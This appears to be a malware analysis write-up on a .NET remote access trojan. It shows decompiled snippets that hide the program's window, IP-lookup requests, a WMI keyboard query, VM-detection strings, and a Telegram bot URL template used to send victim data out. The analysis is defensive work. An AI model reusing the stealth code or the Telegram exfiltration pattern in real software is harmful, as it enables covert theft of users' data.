### CFF explorer

- I ran CFF explorer on the executable file to find that it is a .NET framework executable.

- Let's fire it up inside a VM and see its activity:

### ProcMonitor

### Task Manager

- I used dnSpy 32-bit version to decompile the executable file to get the csharp code of the file.

- First of all , the malware is as usual trying to hide itself from the user hiding its window as well as not making itself visible on the taskbar using:

```
	base.Hide();
	base.WindowState = FormWindowState.Minimized;
	base.FormBorderStyle = FormBorderStyle.None;
	base.ShowInTaskbar = false;
```
- Here I first find the HttpRequest function which is trying to access an unknown host server:

```
http://icanhazip.com
```
- I sent requests to this server only to get an IP-Address: 

![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/be853dec-71f6-4f31-96eb-ac9ed9393d4d)

- This function is trying to access the windows registry keys and modifying them

![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/94e661d0-d342-4a33-bc8a-0365b9939811)

- Registry keys acessed and modified to:

```
SOFTWARE\WOW6432Node\Clients\StartMenuInternet =>SOFTWARE\Clients\StartMenuInternet
```
- The malware tries to find the string `あใはさまゆさปありねひむよとよฃยねปむ` inside the XML documents using the XMLParser.

- The malware is sending a `GET` request to the host: `https://api.telegram.org/bot/sendMessage?chat_id=<chat_id>&text=<Victim's_Data>`

- The malware also tries to capture the keyboard and display control using SQL Queries inside the Registy Key Editor:

![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/f24b3a77-31b8-450e-ba91-ca12859ef4b8)

The base64 string decodes to :

```
Select * from Win32_Keyboard
```
- This function tries to make a `GET` request on:

```
http://ipinfo.io/ip
```

![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/202f669c-ad95-4e94-bd51-da6ba4da1de4)


and is splitting and trimming all the data received by it to get the data in raw format.
- The data received at this host address is another IP-Address:

```
122.176.193.234
```
- The function `fn_check_activity` checks all the results of the functions trying to get the info about the victim's system and use `SQLite.Interop.dll` for this.

- It tries to find some strings inside the Registry Keys Editor in Windows system in order to modify them in favour of the attacker:

```
Microsoft Edge
IEXPLORE.EXE
```
- During my analysis I came up to witness some base64 encoded strings that were being sent to the server after some basic checks on the local system of the victim.
```
4puU77iPIERFVEVDVCBWTSxTQU5CT1g6 : {⛔️ DETECT VM,SANBOX:} 
VG8gY29udGludWUgcGxlYXNlIHdyaXRlIHRoZSBjb250ZW50OiBbSFdJRF0tU0tJUCBWTSBPciDinYwgRXhpdCAgOltIV0lEXS1FWElU : {To continue please write the content: [HWID]-SKIP VM Or ❌ Exit  :[HWID]-EXIT}

```

- This function makes a GET request to `
https://api.telegram.org/bot
` and try to give a form of data to a telegram bot.

- However if the chat_id is not known.

```
{"ok":false,"error_code":404,"description":"Not Found"}
```
- The malware is using FNV hashing algorithm to hash the strings inside the malware

- This string is added to access the updates as got by the bot from the web server where the bot is working: `https://api.telegram.org/bot/getUpdates`

#### It is a RAT which is doing various malicious activities like: 
- Modifying Windows Registry keys
- `GET` Requests to unknown malicious websites.
- Setting up a Telegram Bot to update send the victim's private data and update it regularly.
